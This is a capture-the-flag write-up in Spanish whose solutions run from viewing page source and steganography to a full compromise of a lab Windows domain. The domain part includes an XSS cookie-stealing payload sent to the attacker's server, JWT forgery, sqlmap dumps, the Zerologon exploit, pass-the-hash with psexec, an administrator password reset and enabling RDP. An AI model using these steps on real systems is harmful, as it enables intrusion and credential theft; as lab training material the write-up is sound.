# CTF-ITESO-O2022

# WEB
## Challenge
- HTML index
- U.S. Government
---
## flag{H7ML_1nd3x}
Ejecutamos `CTRL+U` para abrir el codigo fuente.
Luegp `CTRL+F` y buscamos `flag`.
Dandonos la flag.

![PNG](/images/Pasted%20image%2020221031145907.png)

## flag{Mollie_the_crab}
Vamos a [La Casa Blanca](https://www.whitehouse.gov/es/) y vamos al código fuente, donde en un comentario nos dan otra URL.
La cual vamos al código fuente y vemos un Ascii Art, junto con el nombre del cangrejo.

![PNG](/images/Pasted%20image%2020221031150245.png)

---
# Crypto
## Challenge
- Decrypt
---
## flag{R34l_Crypt0}
Nos dan un archivo `.zip` el cual descomprimimos, y nos deja 3 archivos.
Ejecutamos el archivo `.py`, mandamos como parámetro el `.en` y ponemos la contraseña que esta en `pw.txt`, lo cual nos da la flag.

![PNG](/images/Pasted%20image%2020221031152115.png)

---
# OSINT/Forense
## Challenge
- Matryoshka
- Pcap
---
## flag{573g4n0gr4f1a}
Nos dan una imagen `matryoshka.jpg`
Hicimos un `binwalk`, donde genero otra imagen `matryoshka2.jpg`, donde se hizo sucesivamente hasta que nos dejo un archivo `flag.txt`
```bash
binwalk -e matryoshka.jpg
```
`flag.txt`:

![PNG](/images/Pasted%20image%2020221031151307.png)

## flag{ftp_is_better_than_dropbox}
Nos dan un archivo `.pcapng` el cual abrimos con Wireshark, examinamos los paquetes que simulan una conexión `FTP`, donde capturamos el paquete con la contraseña, al ser `FTP` texto plano, obtenemos la contraseña o flag.

![PNG](/images/Pasted%20image%2020221031152957.png)
---
# Real Hacking
## Challenge
- Kim Web
- PyCode
---
## flag{Do_You_Know_??_I_4m_Kim_Anime_Watcher_And_Web_Applications_Hacker}

Nos dan una pagina, la cual nos metemos al código fuente y vemos un script representado en una linea y en hexadecimal.

![PNG](/images/Pasted%20image%2020221031154011.png)

Por lo que se copia toda la linea y se procesa en [Online JavaScript beautifier](https://beautifier.io/) el cual nos muestra el código de manera legible, dándonos la flag.

![PNG](/images/Pasted%20image%2020221031154205.png)

## flag{1337_4l11111f3}
Nos dan un archivo `.zip`, el aparenta tener una pagina web hecha con flask.
Donde hay un archivo `util.pyc`, al cual le hacemos un `strings` y vemos una URL.

![PNG](/images/Pasted%20image%2020221031154859.png)

Abrimos el link.

![PNG](/images/Pasted%20image%2020221031154945.png)

Vemos un string en hexadecimal, lo procesamos en convertidor de hex to text y obtenemos la flag.

![PNG](/images/Pasted%20image%2020221031155056.png)

---
# Nueva Categoría
## Challenge
- Felicidades
---
## FLAG{CH3ckp01n7}
Al hacer los retos anteriores, nos dan esta flag.

![PNG](/images/Pasted%20image%2020221031152340.png)

---
# W10
## Challenge
- index
- Commits
- SQL Injection
- API_FLAG
- cUrlEr v0.1
- System 1
- System 2
- System 3
- System 4
- System 5
- Todo List
- Sticky Notes
- BONUS 1 (Admin Password)
- BONUS 2 (RDP)
---
## Get VM IP
Hacemos un escaneo en todo el segmento.
```bash
nmap -sP 192.168.100.0/24 >/dev/null && arp -an
```

Luego filtramos la tabla ARP por la MAC de la VM.
```bash
ip neighbor | grep -i "[MAC]" | cut -d "" -f1
```

Editamos `/etc/hosts` y agregamos la entrada para la IP.
`[IP_VM]    geohome.com`

---
## NMAP scan

![PNG](/images/Pasted%20image%2020221031104734.png)

---
## FLAG{sanitize_input}
Como el reto se llamaba index, decidí buscar por un `/index`, `/index.php` y `/index.html`, donde `/index.php` nos mando una pagina con un input.

![PNG](/images/Pasted%20image%2020221031132100.png)

Seguido de eso levantamos un servidor http con python.
```bash
python3 -m http.server 8888
```

Y en el input ingresamos el siguiente código para robar las cookies.
```html
<script>var i=new Image;i.src="http://192.168.100.77:8888/?"+document.cookie;</script>
```
Y nuestro servidor nos da la respuestas junto con la cookie que es la flag.

![PNG](/images/Pasted%20image%2020221031132345.png)

---
## FLAG{ALWAYS_CHECK_COMMITS}
Viendo que en el puerto 443 hay un `robots.txt` el cual contiene un comentario con `# https://wp.geohome.com`
Editamos `/etc/hosts` y agregamos la entrada para la IP.
`[IP_VM]    wp.geohome.com`

Abrimos el enlace `https://wp.geohome.com`
Y nos manda a esta pagina.

![PNG](/images/Pasted%20image%2020221031124419.png)

Done al pie de pagina hay un enlace a un repositorio de GitHub.

![PNG](/images/Pasted%20image%2020221031124516.png)

Donde en uno de los commits conseguimos la flag.

![PNG](/images/Pasted%20image%2020221031124623.png)

---
## API_FLAG{Never_public_your_secret}

Viendo el `FLAG{ALWAYS_CHECK_COMMITS}` commit obtenemos la API key.

![PNG](/images/Pasted%20image%2020221031133816.png)

Y en el `` vemos como podemos registrar y hacer login, mandando como parámetros el `username` y `password`.

![PNG](/images/Pasted%20image%2020221031134021.png)
En nuestro `nmap` vimos el puerto 5000 abierto, y con la pista del reto como texto.
Por lo que a traves de ese puerto se envían los requests.
Abrimos `Postman`.
E ingresamos la URL http://wp.geohome.com:5000/register y enviamos la contraseña y usuario en formato JSON.

![PNG](/images/Pasted%20image%2020221031134458.png)

Una vez registrado hacemos login.

![PNG](/images/Pasted%20image%2020221031134617.png)

Ahora con el `access_token` vamos a [jwt.io](https://jwt.io), e ingresamos nuestro token.
Modificamos `sub`, ponemos `admin`, e ingresamos la API key en el payload.

![PNG](/images/Pasted%20image%2020221031134930.png)

Copiamos nuestro nuevo Token y hacemos un curl a `/admin`.
```bash
curl http://wp.geohome.com:5000/admin -H "Authorization: Bearer [TOKEN]"
```
Y nos da el output con la flag.

![PNG](/images/Pasted%20image%2020221031135411.png)

---
## FLAG{SSRF_PARA_TOD@S_XD}
Usando `wfuzz` enumeramos directorios mediante un diccionario.
```bash
wfuzz -c -hc -w [wordlist] http://geohome.com/FUZZ.php
```
Obtenemos esto:

![PNG](/images/Pasted%20image%2020221031140135.png)

Dándonos un `/testsite.php`
Abrimos la URL http://geohome.com/testsite.php

![PNG](/images/Pasted%20image%2020221031140629.png)

Vemos que si ingreso index.php me manda a la pantalla de windows server.

![PNG](/images/Pasted%20image%2020221031140712.png)

Por lo que ahora intentamos con `http://localhost:1337`
Lo que nos arroja algo de seguridad.

![PNG](/images/Pasted%20image%2020221031141041.png)

El cual intentando hacer bypass no se pudo, con base64, hexadecimales, se intento jugando entre Mayúsculas y minúsculas y nos dio el resultado con la flag.

![PNG](/images/Pasted%20image%2020221031142444.png)

---
## FLAG{Update_Plugins!}
Verificando https://wp.geohome/robots.txt vemos lo siguiente:

![PNG](/images/Pasted%20image%2020221031125328.png)

Donde anteriormente `nmap` nos dijo que en el puerto 443 existia este archivo.
Lo que se hizo primeramente fue enumerar las tablas con `sqlmap`
```bash
sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --tables
```
El cual nos arroja la tabla `flag`.
Entonces ahora hacemos un dump sobre esa tabla.
```bash
sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --dump -D flag -T flag
```
Donde nos muestra la tabla y su contenido, en este caso la flag.

![PNG](/images/Pasted%20image%2020221031130111.png)

---
## FLAGS System Access
Nmap.

![PNG](/images/Pasted%20image%2020221031102723.png)

Usando un escaneo vemos que el puerto 135 (RPC) esta abierto, buscamos en la base de datos de exploits de Redhat filtrando por critical.

![PNG](/images/Pasted%20image%2020221031093840.png)

Una vez con esta vulnerabilidad (CVE-2020-1472) buscamos su exploit.
Nos encontramos con este repositorio que cuenta con el exploit [CVE-2020-1472_Exploit]([VoidSec/CVE-2020-1472: Exploit Code for CVE-2020-1472 aka Zerologon (github.com)](https://github.com/VoidSec/CVE-2020-1472)).

Corremos el script.
```bash
./cve-2020-1472-exploit.py -n GEOHOME -t geohome.com
```
Y nos da el siguiente output.
```bash
[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.
```

Dejándonos la cuenta Administrator con una contraseña vacía.
Lo que nos permite capturar los hashes de los usuarios usando impacket-secretsdump.

```bash
impacket-secretsdump -just-dc -no-pass GEOHOME-DC\$@geohome.com
```

Donde nos arrojara los hashes de las cuentas de AD.

![PNG](/images/Pasted%20image%2020221031102218.png)

Con esta information nos vamos a msfconsole.
Y buscamos el exploit "windows/smb/psexec"
Y llenamos los siguientes parametros.

```json
	RHOST: "geohome.com",
	SMBDomain: "GEOHOME",
	SMBPass: "[Hash]",
	SMBUser: "Administrator"
```

Escribimos run y nos da acceso.

```bash
meterpreter > |
```

Y exploramos la carpeta Desktop de los usuarios mencionados, donde viene un .txt con las flags.

```json
	"eescalera_flag.txt": "FLAG{Mas_uno_por_revisar_sistema}",
	"jenriques_flag.txt": "FLAG{Buen_Password_Spraying_Eh?}",
	"pcasimiro_flag.txt": "FLAG{Pesadilla_en_el_trabajo}",
	"sguerrero_flag.txt": "FLAG{Ay_Ay_Vigila_Tu_Puesto}",
	"svc-spooler_flag.txt": "FLAG{A_su_servicio}",
```

---
## flag{New_Administrator}
Una vez en el meterpreter, ingresamos el siguiente comando para acceder a una shell de windows.
```bash
shell
```
Cambiamos la contraseña de administrador de la siguiente manera.
```shell
net user Administrator pw3edB4by
```

---
## flag{Otra_Entrada}
Con el siguiente comando activamos RDP.
```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
 Abrimos una conexión RDP con la IP de la maquina, ingresamos las credenciales:
```json
User: "Administrator",
Password: "pw3edB4by"
```

![PNG](/images/Pasted%20image%2020221031093024.png)

Y entramos a la maquina por RDP.

![PNG](/images/Pasted%20image%2020221031093145.png)

---
## FLAG{El_Buen_OSINT_Naito}
Examinando los directorios nos encontramos con este correo.

![PNG](/images/Pasted%20image%2020221031093432.png)

Seguimos en enlace y obtenemos la flag.

![PNG](/images/Pasted%20image%2020221031093539.png)

---
## FLAG{Sticky_Notes_FTW}
Usando la pista que jenriques cuenta con la flag, y el reto se llama StickyNotes.
Buscando en google damos con la ruta donde se encuentran almacenadas las notas.

La cual es: ```C:\Users[User]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\```

Hacemos un cat.
```bash
cat plum.sqli-wal | findstr "^FLAG"
```

Donde nos arroja varias líneas, pero con buen ojo se alcanza a ver la flag.

![PNG](/images/Pasted%20image%2020221031102513.png)

---
